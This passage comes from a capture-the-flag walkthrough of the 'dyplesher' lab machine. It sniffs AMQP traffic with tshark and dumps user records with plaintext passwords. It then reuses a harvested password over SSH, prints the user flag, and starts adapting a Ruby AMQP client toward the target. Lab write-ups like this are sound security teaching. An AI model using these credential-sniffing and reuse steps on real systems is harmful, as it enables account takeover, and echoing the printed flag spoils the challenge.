class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Let&#x27;s remove blank lines from the output with either <code>sed &#x27;/^$/d&#x27;</code> or <code>awk &#x27;NF &gt; 0&#x27;</code>.
Then we need to convert the hexadecimal to ASCII text. As we sniffed traffic
for a long time let&#x27;s remove non unique lines too.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ tshark -r /tmp/cyfun.pcap -Y &#x27;amqp&#x27; -T fields -e amqp.payload | awk &#x27;NF &gt; 0&#x27; | sort -u | xxd -r -p</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">{&quot;name&quot;:&quot;Anita Romaguera&quot;,&quot;email&quot;:&quot;harry53@marquardt.net&quot;,&quot;address&quot;:&quot;46067 Cyrus Drive\nPetestad, AZ 93194&quot;,&quot;password&quot;:&quot;UQc3l0pYLBMi&quot;,&quot;subscribed&quot;:true}{&quot;name&quot;:&quot;Carol Cronin&quot;,&quot;email&quot;:&quot;peyton29@gmail.com&quot;,&quot;address&quot;:&quot;9051 Morton Via\nWest Reid, VT 76209&quot;,&quot;password&quot;:&quot;DS3Tgljvn4Eu&quot;,&quot;subscribed&quot;:true}{&quot;name&quot;:&quot;Clemmie Bradtke&quot;,&quot;email&quot;:&quot;aratke@gmail.com&quot;,&quot;address&quot;:&quot;5495 Mohr Lights Suite 889\nEast Emiliano, AZ 59769&quot;,&quot;password&quot;:&quot;U3aWxNj9Cvnz&quot;,&quot;subscribed&quot;:true}{&quot;name&quot;:&quot;Damon Daugherty&quot;,&quot;email&quot;:&quot;abbott.rubye@hotmail.com&quot;,&quot;address&quot;:&quot;84310 Huel Turnpike Apt. 388\nLake Wilfred, CA 04957&quot;,&quot;password&quot;:&quot;WVXsGShbMH8q&quot;,&quot;subscribed&quot;:true}{&quot;name&quot;:&quot;Dane Hauck I&quot;,&quot;email&quot;:&quot;monte.morissette@cronin.net&quot;,&quot;address&quot;:&quot;2471 Reichert Isle Suite 158\nPort Buckmouth, MT 15530&quot;,&quot;password&quot;:&quot;UQc3l0pYLBMi&quot;,&quot;subscribed&quot;:true}{&quot;name&quot;:&quot;Darrion Grimes&quot;,&quot;email&quot;:&quot;ernest.stracke@gmail.com&quot;,&quot;address&quot;:&quot;45096 Wintheiser Lock\nErinmouth, VT 47589-2467&quot;,&quot;password&quot;:&quot;UQc3l0pYLBMi&quot;,&quot;subscribed&quot;:true}{&quot;name&quot;:&quot;Denis Keeling&quot;,&quot;email&quot;:&quot;kailey38@gmail.com&quot;,&quot;address&quot;:&quot;97963 Wolff Isle Apt. 133\nSouth Fabian, AL 16184-5768&quot;,&quot;password&quot;:&quot;UQc3l0pYLBMi&quot;,&quot;subscribed&quot;:true}{&quot;name&quot;:&quot;Devante Bergnaum&quot;,&quot;email&quot;:&quot;derrick48@yahoo.com&quot;,&quot;address&quot;:&quot;497 Maximus Courts Apt. 604\nPort Earlene, WY 11810-2574&quot;,&quot;password&quot;:&quot;DS3Tgljvn4Eu&quot;,&quot;subscribed&quot;:true}{&quot;name&quot;:&quot;Dr. Jovany Reynolds PhD&quot;,&quot;email&quot;:&quot;nitzsche.amiya@hegmann.org&quot;,&quot;address&quot;:&quot;42668 Kunde Heights\nNew Karianne, ND 47750&quot;,&quot;password&quot;:&quot;UQc3l0pYLBMi&quot;,&quot;subscribed&quot;:true}{&quot;name&quot;:&quot;Dr. Rickie Larkin III&quot;,&quot;email&quot;:&quot;twunsch@farrell.com&quot;,&quot;address&quot;:&quot;712 Botsford Station\nEbertmouth, AR 25709&quot;,&quot;password&quot;:&quot;DS3Tgljvn4Eu&quot;,&quot;subscribed&quot;:true}{&quot;name&quot;:&quot;Eduardo Ledner&quot;,&quot;email&quot;:&quot;kylie.streich@kohler.biz&quot;,&quot;address&quot;:&quot;53166 Rhea Island\nEffertzland, AL 11861-2681&quot;,&quot;password&quot;:&quot;UQc3l0pYLBMi&quot;,&quot;subscribed&quot;:true}{&quot;name&quot;:&quot;Emilio Kunze PhD&quot;,&quot;email&quot;:&quot;uhintz@flatley.com&quot;,&quot;address&quot;:&quot;92661 Eldridge Tunnel\nNorth Hilmaside, MI 75506&quot;,&quot;password&quot;:&quot;WVXsGShbMH8q&quot;,&quot;subscribed&quot;:true}{&quot;name&quot;:&quot;Hermann Jenkins&quot;,&quot;email&quot;:&quot;toy31@ullrich.com&quot;,&quot;address&quot;:&quot;47917 Swift Loaf\nOrvalchester, DE 25172-1335&quot;,&quot;password&quot;:&quot;DS3Tgljvn4Eu&quot;,&quot;subscribed&quot;:true}{&quot;name&quot;:&quot;Hillard Price IV&quot;,&quot;email&quot;:&quot;lstrosin@reynolds.com&quot;,&quot;address&quot;:&quot;30711 Kenyatta Estate Apt. 817\nRitchiestad, MD 97813&quot;,&quot;password&quot;:&quot;UQc3l0pYLBMi&quot;,&quot;subscribed&quot;:true}{&quot;name&quot;:&quot;Humberto Hamill&quot;,&quot;email&quot;:&quot;athena.rath@yahoo.com&quot;,&quot;address&quot;:&quot;9189 Bill Expressway\nNorth Eleonoreborough, WY 53000-3702&quot;,&quot;password&quot;:&quot;DS3Tgljvn4Eu&quot;,&quot;subscribed&quot;:true}{&quot;name&quot;:&quot;Ike Schimmel&quot;,&quot;email&quot;:&quot;brionna.bergstrom@hodkiewicz.com&quot;,&quot;address&quot;:&quot;13611 Keebler Islands\nPort Mallietown, IL 75533&quot;,&quot;password&quot;:&quot;DS3Tgljvn4Eu&quot;,&quot;subscribed&quot;:true}{&quot;name&quot;:&quot;Jesse Lang&quot;,&quot;email&quot;:&quot;schoen.maeve@nienow.com&quot;,&quot;address&quot;:&quot;476 Cristina Stream Suite 613\nFarrellport, ID 80122&quot;,&quot;password&quot;:&quot;UQc3l0pYLBMi&quot;,&quot;subscribed&quot;:true}{&quot;name&quot;:&quot;Johanna Krajcik&quot;,&quot;email&quot;:&quot;kaycee86@gmail.com&quot;,&quot;address&quot;:&quot;865 Lafayette Plains Apt. 002\nEmardtown, UT 19539&quot;,&quot;password&quot;:&quot;UQc3l0pYLBMi&quot;,&quot;subscribed&quot;:true}{&quot;name&quot;:&quot;Kelvin Fisher III&quot;,&quot;email&quot;:&quot;winifred.donnelly@skiles.com&quot;,&quot;address&quot;:&quot;4462 Tianna Cliff\nLake Brycen, IN 39621-4629&quot;,&quot;password&quot;:&quot;UQc3l0pYLBMi&quot;,&quot;subscribed&quot;:true}{&quot;name&quot;:&quot;Letitia Bechtelar DVM&quot;,&quot;email&quot;:&quot;deshawn.jenkins@gmail.com&quot;,&quot;address&quot;:&quot;62951 Aniya Run\nCarrollview, DC 05863&quot;,&quot;password&quot;:&quot;DS3Tgljvn4Eu&quot;,&quot;subscribed&quot;:true}{&quot;name&quot;:&quot;Lillie Lind&quot;,&quot;email&quot;:&quot;ibaumbach@yahoo.com&quot;,&quot;address&quot;:&quot;53647 Lew Stravenue Suite 212\nAustenton, NC 22933-9463&quot;,&quot;password&quot;:&quot;WVXsGShbMH8q&quot;,&quot;subscribed&quot;:true}{&quot;name&quot;:&quot;Lonnie Cole IV&quot;,&quot;email&quot;:&quot;eulah.schmidt@pacocha.biz&quot;,&quot;address&quot;:&quot;7424 Elwin Island\nEichmannstad, OR 44002-0948&quot;,&quot;password&quot;:&quot;U3aWxNj9Cvnz&quot;,&quot;subscribed&quot;:true}{&quot;name&quot;:&quot;Michele Fahey&quot;,&quot;email&quot;:&quot;pacocha.isobel@yost.com&quot;,&quot;address&quot;:&quot;811 Dickens Falls\nSouth Catalinaview, WY 24879&quot;,&quot;password&quot;:&quot;WVXsGShbMH8q&quot;,&quot;subscribed&quot;:true}{&quot;name&quot;:&quot;MinatoTW&quot;,&quot;email&quot;:&quot;MinatoTW@dyplesher.htb&quot;,&quot;address&quot;:&quot;India&quot;,&quot;password&quot;:&quot;bihys1amFov&quot;,&quot;subscribed&quot;:true}{&quot;name&quot;:&quot;Miss Mylene Schinner V&quot;,&quot;email&quot;:&quot;bailey.gerhold@gmail.com&quot;,&quot;address&quot;:&quot;699 Eichmann Crossing\nHoweside, TN 44971-6929&quot;,&quot;password&quot;:&quot;DS3Tgljvn4Eu&quot;,&quot;subscribed&quot;:true}{&quot;name&quot;:&quot;Miss Theodora Fritsch&quot;,&quot;email&quot;:&quot;runte.howell@gmail.com&quot;,&quot;address&quot;:&quot;526 Anabel Lock\nSchultzside, IA 12133-5570&quot;,&quot;password&quot;:&quot;DS3Tgljvn4Eu&quot;,&quot;subscribed&quot;:true}{&quot;name&quot;:&quot;Mr. Humberto Kertzmann DVM&quot;,&quot;email&quot;:&quot;roscoe87@tremblay.com&quot;,&quot;address&quot;:&quot;859 Frami Stream\nLake Jaime, AR 41384&quot;,&quot;password&quot;:&quot;WVXsGShbMH8q&quot;,&quot;subscribed&quot;:true}{&quot;name&quot;:&quot;Mrs. Hertha McCullough&quot;,&quot;email&quot;:&quot;mckenzie.hanna@gmail.com&quot;,&quot;address&quot;:&quot;635 Brenna Highway\nGracietown, LA 91067&quot;,&quot;password&quot;:&quot;WVXsGShbMH8q&quot;,&quot;subscribed&quot;:true}{&quot;name&quot;:&quot;Ms. Earlene Walker II&quot;,&quot;email&quot;:&quot;nannie.osinski@stroman.com&quot;,&quot;address&quot;:&quot;937 Pamela Summit Suite 176\nNorth Marilyne, NY 81843-6436&quot;,&quot;password&quot;:&quot;WVXsGShbMH8q&quot;,&quot;subscribed&quot;:true}{&quot;name&quot;:&quot;Murphy Runolfsdottir&quot;,&quot;email&quot;:&quot;kailey.schmeler@koelpin.com&quot;,&quot;address&quot;:&quot;904 Weber Radial Apt. 285\nNew Carmine, MO 27520-2820&quot;,&quot;password&quot;:&quot;WVXsGShbMH8q&quot;,&quot;subscribed&quot;:true}{&quot;name&quot;:&quot;Pete Littel DVM&quot;,&quot;email&quot;:&quot;shanon.vandervort@schultz.com&quot;,&quot;address&quot;:&quot;7319 Emanuel Stream Suite 632\nWest Lamonttown, WY 40093-3120&quot;,&quot;password&quot;:&quot;U3aWxNj9Cvnz&quot;,&quot;subscribed&quot;:true}{&quot;name&quot;:&quot;Prof. Francisco Kunde Jr.&quot;,&quot;email&quot;:&quot;hank42@hotmail.com&quot;,&quot;address&quot;:&quot;376 Keon Turnpike Suite 065\nWest Jeffery, MA 50951-0757&quot;,&quot;password&quot;:&quot;U3aWxNj9Cvnz&quot;,&quot;subscribed&quot;:true}{&quot;name&quot;:&quot;Prof. Leilani Effertz&quot;,&quot;email&quot;:&quot;thansen@yahoo.com&quot;,&quot;address&quot;:&quot;720 Halvorson Crossroad Apt. 108\nKubshire, PA 20697&quot;,&quot;password&quot;:&quot;U3aWxNj9Cvnz&quot;,&quot;subscribed&quot;:true}{&quot;name&quot;:&quot;Prof. Shanel Quigley IV&quot;,&quot;email&quot;:&quot;johnson.golda@treutel.biz&quot;,&quot;address&quot;:&quot;131 Marguerite Plain Suite 250\nEast Unique, AK 87442&quot;,&quot;password&quot;:&quot;DS3Tgljvn4Eu&quot;,&quot;subscribed&quot;:true}{&quot;name&quot;:&quot;Prof. Sylvester Macejkovic&quot;,&quot;email&quot;:&quot;vgreenholt@herzog.org&quot;,&quot;address&quot;:&quot;741 Delfina Canyon Suite 380\nPort Kimberlyfort, OK 57900&quot;,&quot;password&quot;:&quot;U3aWxNj9Cvnz&quot;,&quot;subscribed&quot;:true}{&quot;name&quot;:&quot;Prof. Zackery Labadie MD&quot;,&quot;email&quot;:&quot;natasha68@kertzmann.com&quot;,&quot;address&quot;:&quot;52379 Alvina Landing\nWeimanntown, KY 07869-5622&quot;,&quot;password&quot;:&quot;U3aWxNj9Cvnz&quot;,&quot;subscribed&quot;:true}{&quot;name&quot;:&quot;Raymond Krajcik&quot;,&quot;email&quot;:&quot;obradtke@gmail.com&quot;,&quot;address&quot;:&quot;638 Kozey Cape Apt. 329\nSouth Ignacio, WV 94812&quot;,&quot;password&quot;:&quot;U3aWxNj9Cvnz&quot;,&quot;subscribed&quot;:true}{&quot;name&quot;:&quot;Roy Sipes&quot;,&quot;email&quot;:&quot;skulas@wolf.com&quot;,&quot;address&quot;:&quot;808 Grimes Keys\nWest Abe, IA 34906-1613&quot;,&quot;password&quot;:&quot;WVXsGShbMH8q&quot;,&quot;subscribed&quot;:true}{&quot;name&quot;:&quot;Warren Kutch MD&quot;,&quot;email&quot;:&quot;jeffery69@gmail.com&quot;,&quot;address&quot;:&quot;2759 Teagan Mission Apt. 736\nKristinfurt, AR 21528-3615&quot;,&quot;password&quot;:&quot;U3aWxNj9Cvnz&quot;,&quot;subscribed&quot;:true}{&quot;name&quot;:&quot;Yazmin Connelly I&quot;,&quot;email&quot;:&quot;cullen72@kunde.com&quot;,&quot;address&quot;:&quot;9625 Amari Centers Suite 611\nPredovicport, CT 24073-1889&quot;,&quot;password&quot;:&quot;U3aWxNj9Cvnz&quot;,&quot;subscribed&quot;:true}{&quot;name&quot;:&quot;Yazmin Hermann&quot;,&quot;email&quot;:&quot;sage.hansen@erdman.com&quot;,&quot;address&quot;:&quot;83420 General Manor Suite 115\nKoelpinfurt, AK 63347-8782&quot;,&quot;password&quot;:&quot;WVXsGShbMH8q&quot;,&quot;subscribed&quot;:true}{&quot;name&quot;:&quot;felamos&quot;,&quot;email&quot;:&quot;felamos@dyplesher.htb&quot;,&quot;address&quot;:&quot;India&quot;,&quot;password&quot;:&quot;tieb0graQueg&quot;,&quot;subscribed&quot;:true}{&quot;name&quot;:&quot;yuntao&quot;,&quot;email&quot;:&quot;yuntao@dyplesher.htb&quot;,&quot;address&quot;:&quot;Italy&quot;,&quot;password&quot;:&quot;wagthAw4ob&quot;,&quot;subscribed&quot;:true}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>There are a lot of accounts we don&#x27;t care about but some are familiars:</p><div class="language-json codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-json codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token property">&quot;name&quot;</span><span class="token operator">:</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;MinatoTW&quot;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token property">&quot;email&quot;</span><span class="token operator">:</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;MinatoTW@dyplesher.htb&quot;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token property">&quot;address&quot;</span><span class="token operator">:</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;India&quot;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token property">&quot;password&quot;</span><span class="token operator">:</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;bihys1amFov&quot;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token property">&quot;subscribed&quot;</span><span class="token operator">:</span><span class="token plain"> </span><span class="token boolean">true</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token property">&quot;name&quot;</span><span class="token operator">:</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;felamos&quot;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token property">&quot;email&quot;</span><span class="token operator">:</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;felamos@dyplesher.htb&quot;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token property">&quot;address&quot;</span><span class="token operator">:</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;India&quot;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token property">&quot;password&quot;</span><span class="token operator">:</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;tieb0graQueg&quot;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token property">&quot;subscribed&quot;</span><span class="token operator">:</span><span class="token plain"> </span><span class="token boolean">true</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token property">&quot;name&quot;</span><span class="token operator">:</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;yuntao&quot;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token property">&quot;email&quot;</span><span class="token operator">:</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;yuntao@dyplesher.htb&quot;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token property">&quot;address&quot;</span><span class="token operator">:</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;Italy&quot;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token property">&quot;password&quot;</span><span class="token operator">:</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;wagthAw4ob&quot;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token property">&quot;subscribed&quot;</span><span class="token operator">:</span><span class="token plain"> </span><span class="token boolean">true</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>If we connect to felamos account via SSH we can find the user flag in its user directory.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ felamos@dyplesher:~$ cat user.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">cf35f5276f3646c8838c6e4c5267ea52</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="privilege-escalation-of-machine--from-felamos-to-root">Privilege Escalation of Machine : from felamos to root<a href="#privilege-escalation-of-machine--from-felamos-to-root" class="hash-link" aria-label="Direct link to Privilege Escalation of Machine : from felamos to root" title="Direct link to Privilege Escalation of Machine : from felamos to root">​</a></h2><p>We already listened to AMQP server but we have even more clues that we need to
continue that way.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">felamos@dyplesher:~$ cat yuntao/send.sh</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">#!/bin/bash</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">echo &#x27;Hey yuntao, Please publish all cuberite plugins created by players on plugin_data &quot;Exchange&quot; and &quot;Queue&quot;. Just send url to download plugins and our new code will review it and working plugins will be added to the server.&#x27; &gt;  /dev/pts/{}</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">felamos@dyplesher:~$ ps -ef f | grep mq</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">rabbitmq   901     1  0 06:47 ?        Ss     0:00 /bin/sh /usr/sbin/rabbitmq-server</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">rabbitmq  1003   901  0 06:47 ?        Sl     1:45  \_ /usr/lib/erlang/erts-10.4.4/bin/beam.smp -W w -A 64 -MBas ageffcbf -MHas ageffcbf -MBlmbcs 512 -MHlmbcs 512 -MMmcs 30 -P 1048576 -t 5000000 -stbt db -zdbbl 128000 -K true -- -root /usr/lib/erlang -progname erl -- -home /var/lib/rabbitmq -- -pa /usr/lib/rabbitmq/lib/rabbitmq_server-3.7.8/ebin -noshell -noinput -s rabbit boot -sname rabbit@dyplesher -boot start_sasl -kernel inet_default_connect_options [{nodelay,true}] -sasl errlog_type error -sasl sasl_error_logger false -rabbit lager_log_root &quot;/var/log/rabbitmq&quot; -rabbit lager_default_file &quot;/var/log/rabbitmq/rabbit@dyplesher.log&quot; -rabbit lager_upgrade_file &quot;/var/log/rabbitmq/rabbit@dyplesher_upgrade.log&quot; -rabbit enabled_plugins_file &quot;/etc/rabbitmq/enabled_plugins&quot; -rabbit plugins_dir &quot;/usr/lib/rabbitmq/plugins:/usr/lib/rabbitmq/lib/rabbitmq_server-3.7.8/plugins&quot; -rabbit plugins_expand_dir &quot;/var/lib/rabbitmq/mnesia/rabbit@dyplesher-plugins-expand&quot; -os_mon start_cpu_sup false -os_mon start_disksup false -os_mon start_memsup false -mnesia dir &quot;/var/lib/rabbitmq/mnesia/rabbit@dyplesher&quot; -kernel inet_dist_listen_min 25672 -kernel inet_dist_listen_max 25672</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">rabbitmq  2050  1003  0 06:47 ?        Ss     0:01      \_ erl_child_setup 65536</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">rabbitmq  2070  2050  0 06:47 ?        Ss     0:00          \_ inet_gethost 4</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">rabbitmq  2071  2070  0 06:47 ?        S      0:00              \_ inet_gethost 4</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>It seems we need to send a link via AMQP and something will download it.</p><p>There is an awesome easy AMQP client in ruby: <a href="https://github.com/ruby-amqp/bunny" target="_blank" rel="noopener noreferrer">Bunny</a>.
There is also a <a href="https://www.rabbitmq.com/tutorials/tutorial-three-ruby.html" target="_blank" rel="noopener noreferrer">RabbitMQ tutorial</a>
giving examples for our use case with exactly this library.</p><p>So let&#x27;s download the script in the example:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ wget https://github.com/rabbitmq/rabbitmq-tutorials/raw/master/ruby/emit_log.rb</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ gem install bunny</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ cp emit_log.rb amqp.rb</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Let&#x27;s copy the example an modify it in something useable. Ready the doc to
connect to a remote server rather than localhost.</p><div class="language-ruby codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-ruby codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">#!/usr/bin/env ruby</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">require &#x27;bunny&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">options = {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  host: &#x27;10.10.10.190&#x27;,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  port: 5672</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">}</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">connection = Bunny.new(options)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">connection.start</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">channel = connection.create_channel</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">exchange = channel.fanout(&#x27;logs&#x27;)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" 